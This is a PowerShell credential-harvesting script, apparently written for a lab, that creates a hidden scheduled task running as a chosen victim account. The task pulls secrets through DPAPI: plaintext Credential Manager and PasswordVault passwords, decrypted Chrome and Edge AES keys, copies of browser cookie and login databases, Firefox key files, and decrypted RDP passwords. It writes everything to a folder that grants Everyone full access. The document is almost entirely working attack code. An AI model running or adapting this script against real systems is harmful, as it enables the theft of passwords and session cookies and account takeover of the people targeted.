# schtask-dpapi.ps1
# Usage : .\schtask-dpapi.ps1 -TargetUser "LAB\victime" [-OutputDir "C:\Lab\harvest"] [-Timeout 15]
 
param(
    [Parameter(Mandatory)][string]$TargetUser,
    [string]$OutputDir = "C:\Lab\harvest",
    [string]$TaskName = "MaTaskDpapi",
    [int]$Timeout = 15
)
 
New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
icacls $OutputDir /grant "*S-1-1-0:(OI)(CI)F" | Out-Null
 
foreach ($f in @(
    "dpapi.ps1",
    "dpapi-credman.log",
    "dpapi-vault.log",
    "dpapi-masterkeys.log",
    "dpapi-browser-chrome.log",
    "dpapi-browser-edge.log",
    "dpapi-browser-firefox.log",
    "dpapi-rdg.log",
    "dpapi-misc.log"
)) {
    Remove-Item -Path "$OutputDir\$f" -Force -ErrorAction SilentlyContinue
    New-Item -Path "$OutputDir\$f" -ItemType File -Force | Out-Null
    icacls "$OutputDir\$f" /grant "*S-1-1-0:(F)" | Out-Null
}
 
Write-Host "[*] Creating DPAPI harvest script..." -ForegroundColor Cyan
@"
`$outputDir = "$OutputDir"
 
Add-Type -AssemblyName System.Security
 
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.Text;
 
public class WinCred {
 
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct DATA_BLOB {
        public int cbData;
        public IntPtr pbData;
    }
 
    [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CryptUnprotectData(
        ref DATA_BLOB pDataIn,
        StringBuilder ppszDataDescr,
        IntPtr pOptionalEntropy,
        IntPtr pvReserved,
        IntPtr pPromptStruct,
        int dwFlags,
        ref DATA_BLOB pDataOut
    );
 
    [DllImport("kernel32.dll")]
    public static extern IntPtr LocalFree(IntPtr hMem);
 
    public static byte[] DecryptRaw(byte[] data) {
        DATA_BLOB input = new DATA_BLOB();
        DATA_BLOB output = new DATA_BLOB();
        input.cbData = data.Length;
        input.pbData = Marshal.AllocHGlobal(data.Length);
        Marshal.Copy(data, 0, input.pbData, data.Length);
        StringBuilder desc = new StringBuilder();
        try {
            if (!CryptUnprotectData(ref input, desc, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref output))
                return null;
            byte[] decrypted = new byte[output.cbData];
            Marshal.Copy(output.pbData, decrypted, 0, output.cbData);
            LocalFree(output.pbData);
            return decrypted;
        } finally {
            Marshal.FreeHGlobal(input.pbData);
        }
    }
 
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct CREDENTIAL {
        public int Flags;
        public int Type;
        public string TargetName;
        public string Comment;
        public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
        public int CredentialBlobSize;
        public IntPtr CredentialBlob;
        public int Persist;
        public int AttributeCount;
        public IntPtr Attributes;
        public string TargetAlias;
        public string UserName;
    }
 
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CredEnumerate(string filter, int flag, out int count, out IntPtr credentials);
 
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CredRead(string target, int type, int reservedFlag, out IntPtr credential);
 
    [DllImport("advapi32.dll")]
    public static extern void CredFree(IntPtr buffer);
 
    public static string DumpAll() {
        int count; IntPtr credPtr;
        StringBuilder sb = new StringBuilder();
        if (!CredEnumerate(null, 0, out count, out credPtr))
            return "CredEnumerate failed: " + Marshal.GetLastWin32Error();
 
        for (int i = 0; i < count; i++) {
            IntPtr curr = Marshal.ReadIntPtr(credPtr, i * IntPtr.Size);
            CREDENTIAL cred = (CREDENTIAL)Marshal.PtrToStructure(curr, typeof(CREDENTIAL));
 
            byte[] rawBytes = null;
            string textPassword = "";
            bool isBinary = false;
 
            // Extraire les bytes bruts du blob
            if (cred.CredentialBlobSize > 0 && cred.CredentialBlob != IntPtr.Zero) {
                rawBytes = new byte[cred.CredentialBlobSize];
                Marshal.Copy(cred.CredentialBlob, rawBytes, 0, cred.CredentialBlobSize);
 
                // Tenter l interpretation Unicode
                textPassword = Marshal.PtrToStringUni(cred.CredentialBlob, cred.CredentialBlobSize / 2);
 
                // Detecter si c est du binaire (caracteres non-imprimables ASCII)
                foreach (char c in textPassword) {
                    if (c > 0x7E || (c < 0x20 && c != '\r' && c != '\n' && c != '\t')) {
                        isBinary = true;
                        break;
                    }
                }
            }
 
            // Fallback CredRead si blob vide
            if (rawBytes == null || rawBytes.Length == 0) {
                IntPtr credReadPtr = IntPtr.Zero;
                try {
                    if (CredRead(cred.TargetName, 1, 0, out credReadPtr)) {
                        CREDENTIAL cr = (CREDENTIAL)Marshal.PtrToStructure(credReadPtr, typeof(CREDENTIAL));
                        if (cr.CredentialBlobSize > 0 && cr.CredentialBlob != IntPtr.Zero) {
                            rawBytes = new byte[cr.CredentialBlobSize];
                            Marshal.Copy(cr.CredentialBlob, rawBytes, 0, cr.CredentialBlobSize);
                            textPassword = Marshal.PtrToStringUni(cr.CredentialBlob, cr.CredentialBlobSize / 2);
                            isBinary = false;
                            foreach (char c in textPassword) {
                                if (c > 0x7E || (c < 0x20 && c != '\r' && c != '\n' && c != '\t')) {
                                    isBinary = true;
                                    break;
                                }
                            }
                        }
                    }
                } catch {} finally {
                    if (credReadPtr != IntPtr.Zero) CredFree(credReadPtr);
                }
            }
 
            sb.AppendLine("--- Entry " + (i+1) + " ---");
            sb.AppendLine("Type       : " + cred.Type + (cred.Type == 1 ? " (Generic)" : cred.Type == 2 ? " (Domain Password - requires LSASS)" : ""));
            sb.AppendLine("TargetName : " + cred.TargetName);
            sb.AppendLine("UserName   : " + cred.UserName);
 
            if (cred.Type == 2) {
                sb.AppendLine("Password   : [not accessible - Domain credential, requires LSASS]");
            } else if (rawBytes != null && rawBytes.Length > 0) {
                if (isBinary) {
                    // Blob binaire : base64 exploitable
                    sb.AppendLine("BlobType   : BINARY");
                    sb.AppendLine("BlobSize   : " + rawBytes.Length + " bytes");
                    sb.AppendLine("BlobB64    : " + Convert.ToBase64String(rawBytes));
                } else {
                    // Texte lisible en clair
                    sb.AppendLine("Password   : " + textPassword);
                }
            } else {
                sb.AppendLine("Password   : [empty]");
            }
 
            sb.AppendLine("Persist    : " + cred.Persist);
        }
        CredFree(credPtr);
        return sb.ToString();
    }
}
'@ -Language CSharp
 
# ============================================================
# 1. CREDENTIAL MANAGER (passwords en clair pour Generic Type 1)
# ============================================================
"[*] Credential Manager - `$(Get-Date)" | Out-File "`$outputDir\dpapi-credman.log"
try {
    [WinCred]::DumpAll() | Out-File "`$outputDir\dpapi-credman.log" -Append
} catch {
    "[ERROR] CredEnumerate failed : `$_" | Out-File "`$outputDir\dpapi-credman.log" -Append
}
 
# ============================================================
# 2. WINDOWS PASSWORD VAULT (passwords en clair)
# ============================================================
"[*] Windows PasswordVault - `$(Get-Date)" | Out-File "`$outputDir\dpapi-vault.log"
try {
    `$vault = New-Object Windows.Security.Credentials.PasswordVault
    `$vault.RetrieveAll() | ForEach-Object {
        `$_.RetrievePassword()
        "Resource : `$(`$_.Resource)" | Out-File "`$outputDir\dpapi-vault.log" -Append
        "UserName : `$(`$_.UserName)" | Out-File "`$outputDir\dpapi-vault.log" -Append
        "Password : `$(`$_.Password)" | Out-File "`$outputDir\dpapi-vault.log" -Append
        "---" | Out-File "`$outputDir\dpapi-vault.log" -Append
    }
} catch {
    "[ERROR] PasswordVault failed : `$_" | Out-File "`$outputDir\dpapi-vault.log" -Append
}
 
# ============================================================
# 3. MASTERKEYS - liste des fichiers de cles maitresses
# ============================================================
"[*] DPAPI MasterKeys - `$(Get-Date)" | Out-File "`$outputDir\dpapi-masterkeys.log"
`$mkPath = "`$env:APPDATA\Microsoft\Protect"
if (Test-Path `$mkPath) {
    Get-ChildItem `$mkPath -Recurse -Force -ErrorAction SilentlyContinue |
        Select-Object FullName, Length, LastWriteTime |
        Format-List |
        Out-File "`$outputDir\dpapi-masterkeys.log" -Append
} else {
    "[WARN] MasterKeys path not found" | Out-File "`$outputDir\dpapi-masterkeys.log" -Append
}
 
# ============================================================
# 4. CHROME - cle AES + bases de donnees
# ============================================================
"[*] Chrome key files - `$(Get-Date)" | Out-File "`$outputDir\dpapi-browser-chrome.log"
`$chromeLS = "`$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
if (Test-Path `$chromeLS) {
    try {
        `$ls = Get-Content `$chromeLS -Raw | ConvertFrom-Json
        `$encKeyB64 = `$ls.os_crypt.encrypted_key
        if (`$encKeyB64) {
            `$encKey = [System.Convert]::FromBase64String(`$encKeyB64)
            `$encKeyNoPrefix = `$encKey[5..(`$encKey.Length-1)]
            `$decKey = [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]`$encKeyNoPrefix, `$null, 'CurrentUser')
            `$hexKey = [System.BitConverter]::ToString(`$decKey) -replace '-',''
            "Chrome AES key (hex) : `$hexKey" | Out-File "`$outputDir\dpapi-browser-chrome.log" -Append
        }
        if (`$ls.os_crypt.app_bound_encrypted_key) {
            "[WARN] app_bound_encrypted_key found - this key won't decrypt newer cookies/passwords" | Out-File "`$outputDir\dpapi-browser-chrome.log" -Append
        }
    } catch {
        "[ERROR] Chrome key failed : `$_" | Out-File "`$outputDir\dpapi-browser-chrome.log" -Append
    }
} else {
    "[WARN] Chrome Local State not found" | Out-File "`$outputDir\dpapi-browser-chrome.log" -Append
}
 
`$chromeDefault = "`$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
if (Test-Path `$chromeDefault) {
    foreach (`$db in @("Cookies", "Login Data", "History", "Web Data")) {
        `$src = "`$chromeDefault\`$db"
        `$dst = "`$outputDir\chrome-`$(`$db -replace ' ','-').db"
        if (Test-Path `$src) {
            try { Copy-Item `$src `$dst -Force -ErrorAction Stop; "[+] Chrome `$db copied" | Out-File "`$outputDir\dpapi-browser-chrome.log" -Append } catch { "[WARN] Chrome `$db locked (browser running?) : `$_" | Out-File "`$outputDir\dpapi-browser-chrome.log" -Append }
        }
    }
    `$networkCookies = "`$chromeDefault\Network\Cookies"
    if (Test-Path `$networkCookies) {
        try { Copy-Item `$networkCookies "`$outputDir\chrome-Network-Cookies.db" -Force -ErrorAction Stop; "[+] Chrome Network Cookies copied" | Out-File "`$outputDir\dpapi-browser-chrome.log" -Append } catch { "[WARN] Chrome Network Cookies locked : `$_" | Out-File "`$outputDir\dpapi-browser-chrome.log" -Append }
    }
}
 
# ============================================================
# 5. EDGE - cle AES + bases de donnees
# ============================================================
"[*] Edge key files - `$(Get-Date)" | Out-File "`$outputDir\dpapi-browser-edge.log"
`$edgeLS = "`$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
if (Test-Path `$edgeLS) {
    try {
        `$ls = Get-Content `$edgeLS -Raw | ConvertFrom-Json
        `$encKeyB64 = `$ls.os_crypt.encrypted_key
        if (`$encKeyB64) {
            `$encKey = [System.Convert]::FromBase64String(`$encKeyB64)
            `$encKeyNoPrefix = `$encKey[5..(`$encKey.Length-1)]
            `$decKey = [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]`$encKeyNoPrefix, `$null, 'CurrentUser')
            `$hexKey = [System.BitConverter]::ToString(`$decKey) -replace '-',''
            "Edge AES key (hex) : `$hexKey" | Out-File "`$outputDir\dpapi-browser-edge.log" -Append
        }
        if (`$ls.os_crypt.app_bound_encrypted_key) {
            "[WARN] app_bound_encrypted_key found - this key won't decrypt newer cookies/passwords" | Out-File "`$outputDir\dpapi-browser-edge.log" -Append
        }
    } catch {
        "[ERROR] Edge key failed : `$_" | Out-File "`$outputDir\dpapi-browser-edge.log" -Append
    }
} else {
    "[WARN] Edge Local State not found" | Out-File "`$outputDir\dpapi-browser-edge.log" -Append
}
 
`$edgeDefault = "`$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
if (Test-Path `$edgeDefault) {
    foreach (`$db in @("Cookies", "Login Data", "History", "Web Data")) {
        `$src = "`$edgeDefault\`$db"
        `$dst = "`$outputDir\edge-`$(`$db -replace ' ','-').db"
        if (Test-Path `$src) {
            try { Copy-Item `$src `$dst -Force -ErrorAction Stop; "[+] Edge `$db copied" | Out-File "`$outputDir\dpapi-browser-edge.log" -Append } catch { "[WARN] Edge `$db locked (browser running?) : `$_" | Out-File "`$outputDir\dpapi-browser-edge.log" -Append }
        }
    }
    `$networkCookies = "`$edgeDefault\Network\Cookies"
    if (Test-Path `$networkCookies) {
        try { Copy-Item `$networkCookies "`$outputDir\edge-Network-Cookies.db" -Force -ErrorAction Stop; "[+] Edge Network Cookies copied" | Out-File "`$outputDir\dpapi-browser-edge.log" -Append } catch { "[WARN] Edge Network Cookies locked : `$_" | Out-File "`$outputDir\dpapi-browser-edge.log" -Append }
    }
}
 
# ============================================================
# 6. FIREFOX - fichiers cles + cookies (pas chiffres)
# ============================================================
"[*] Firefox key files - `$(Get-Date)" | Out-File "`$outputDir\dpapi-browser-firefox.log"
`$ffProfiles = Get-ChildItem "`$env:APPDATA\Mozilla\Firefox\Profiles\" -ErrorAction SilentlyContinue | Where-Object { `$_.PSIsContainer }
if (`$ffProfiles) {
    foreach (`$ffp in `$ffProfiles) {
        `$suffix = `$ffp.Name -replace '[^a-zA-Z0-9]','_'
        "[*] Profile : `$(`$ffp.FullName)" | Out-File "`$outputDir\dpapi-browser-firefox.log" -Append
        foreach (`$file in @("key4.db", "logins.json", "cert9.db", "cookies.sqlite")) {
            `$src = "`$(`$ffp.FullName)\`$file"
            if (Test-Path `$src) {
                try { Copy-Item `$src "`$outputDir\firefox-`$suffix-`$file" -Force -ErrorAction Stop; "[+] Copied : `$file" | Out-File "`$outputDir\dpapi-browser-firefox.log" -Append } catch { "[WARN] `$file locked : `$_" | Out-File "`$outputDir\dpapi-browser-firefox.log" -Append }
            } else {
                "[WARN] Not found : `$file" | Out-File "`$outputDir\dpapi-browser-firefox.log" -Append
            }
        }
    }
} else {
    "[WARN] No Firefox profile found" | Out-File "`$outputDir\dpapi-browser-firefox.log" -Append
}
 
# ============================================================
# 7. RDP - fichiers .rdp + dechiffrement password 51:b:
# ============================================================
"[*] RDP files - `$(Get-Date)" | Out-File "`$outputDir\dpapi-rdg.log"
Get-ChildItem "`$env:USERPROFILE" -Filter "*.rdp" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
    "`n--- `$(`$_.FullName) ---" | Out-File "`$outputDir\dpapi-rdg.log" -Append
    Get-Content `$_.FullName | Out-File "`$outputDir\dpapi-rdg.log" -Append
    `$rdpContent = Get-Content `$_.FullName -Raw
    if (`$rdpContent -match 'password 51:b:(.+)') {
        `$blob = `$Matches[1].Trim()
        `$decrypted = `$null
 
        if (-not `$decrypted -and `$blob -match '^[0-9A-Fa-f]+$' -and `$blob.Length % 2 -eq 0) {
            try {
                `$bytes = New-Object byte[] (`$blob.Length / 2)
                for (`$i = 0; `$i -lt `$blob.Length; `$i += 2) {
                    `$bytes[`$i / 2] = [System.Convert]::ToByte(`$blob.Substring(`$i, 2), 16)
                }
                `$decrypted = [WinCred]::DecryptRaw(`$bytes)
                if (`$decrypted) { "[+] RDP Password (hex-decoded) : `$([System.Text.Encoding]::Unicode.GetString(`$decrypted))" | Out-File "`$outputDir\dpapi-rdg.log" -Append }
            } catch {}
        }
 
        if (-not `$decrypted) {
            try {
                `$bytes = [System.Convert]::FromBase64String(`$blob)
                `$decrypted = [WinCred]::DecryptRaw(`$bytes)
                if (`$decrypted) { "[+] RDP Password (base64-decoded) : `$([System.Text.Encoding]::Unicode.GetString(`$decrypted))" | Out-File "`$outputDir\dpapi-rdg.log" -Append }
            } catch {}
        }
 
        if (-not `$decrypted) {
            try {
                `$bytes = [System.Text.Encoding]::Default.GetBytes(`$blob)
                `$decrypted = [WinCred]::DecryptRaw(`$bytes)
                if (`$decrypted) { "[+] RDP Password (raw) : `$([System.Text.Encoding]::Unicode.GetString(`$decrypted))" | Out-File "`$outputDir\dpapi-rdg.log" -Append }
            } catch {}
        }
 
        if (-not `$decrypted) {
            try {
                `$decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect([System.Convert]::FromBase64String(`$blob), `$null, 'CurrentUser')
                if (`$decrypted) { "[+] RDP Password (ProtectedData) : `$([System.Text.Encoding]::Unicode.GetString(`$decrypted))" | Out-File "`$outputDir\dpapi-rdg.log" -Append }
            } catch {}
        }
 
        if (-not `$decrypted) {
            "[WARN] RDP password could not be decrypted (all methods failed)" | Out-File "`$outputDir\dpapi-rdg.log" -Append
        }
    }
}
if ((Get-Item "`$outputDir\dpapi-rdg.log").Length -le 50) {
    "[WARN] No .rdp files found" | Out-File "`$outputDir\dpapi-rdg.log" -Append
}
 
# ============================================================
# 8. DIVERS - Vault, Crypto, SystemCertificates
# ============================================================
"[*] Misc - `$(Get-Date)" | Out-File "`$outputDir\dpapi-misc.log"
foreach (`$p in @("`$env:LOCALAPPDATA\Microsoft\Vault", "`$env:APPDATA\Microsoft\SystemCertificates", "`$env:APPDATA\Microsoft\Crypto")) {
    if (Test-Path `$p) {
        "[*] `$p" | Out-File "`$outputDir\dpapi-misc.log" -Append
        Get-ChildItem `$p -Recurse -Force -ErrorAction SilentlyContinue |
            Select-Object FullName, Length, LastWriteTime |
            Format-List |
            Out-File "`$outputDir\dpapi-misc.log" -Append
    }
}
"@ | Set-Content -Path "$OutputDir\dpapi.ps1" -Encoding ASCII
icacls "$OutputDir\dpapi.ps1" /grant "*S-1-1-0:(F)" | Out-Null
 
Write-Host "[*] Creating and starting scheduled task as $TargetUser..." -ForegroundColor Cyan
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
$settings  = New-ScheduledTaskSettingsSet -Hidden
$action    = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $OutputDir\dpapi.ps1" -WorkingDirectory $OutputDir
$principal = New-ScheduledTaskPrincipal -UserId $TargetUser -LogonType Interactive -RunLevel Limited
Register-ScheduledTask -TaskName $TaskName -Action $action -Principal $principal -Settings $settings -Force | Out-Null
Start-ScheduledTask -TaskName $TaskName
 
Write-Host "[*] Waiting for execution (${Timeout}s)..." -ForegroundColor Cyan
Start-Sleep -Seconds $Timeout
 
$result = (Get-ScheduledTaskInfo -TaskName $TaskName).LastTaskResult
if ($result -eq 0) {
    Write-Host "[+] Success !" -ForegroundColor Green
    Write-Host "`n--- Credential Manager ---" -ForegroundColor Yellow
    Get-Content "$OutputDir\dpapi-credman.log" -ErrorAction SilentlyContinue
    Write-Host "`n--- PasswordVault ---" -ForegroundColor Yellow
    Get-Content "$OutputDir\dpapi-vault.log" -ErrorAction SilentlyContinue
    Write-Host "`n--- Chrome ---" -ForegroundColor Yellow
    Get-Content "$OutputDir\dpapi-browser-chrome.log" -ErrorAction SilentlyContinue
    Write-Host "`n--- Edge ---" -ForegroundColor Yellow
    Get-Content "$OutputDir\dpapi-browser-edge.log" -ErrorAction SilentlyContinue
    Write-Host "`n--- Firefox ---" -ForegroundColor Yellow
    Get-Content "$OutputDir\dpapi-browser-firefox.log" -ErrorAction SilentlyContinue
    Write-Host "`n--- RDP ---" -ForegroundColor Yellow
    Get-Content "$OutputDir\dpapi-rdg.log" -ErrorAction SilentlyContinue
} else {
    Write-Host "[-] Failed (LastTaskResult: $result)" -ForegroundColor Red
}
 
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
Write-Host "[*] Scheduled task deleted." -ForegroundColor Cyan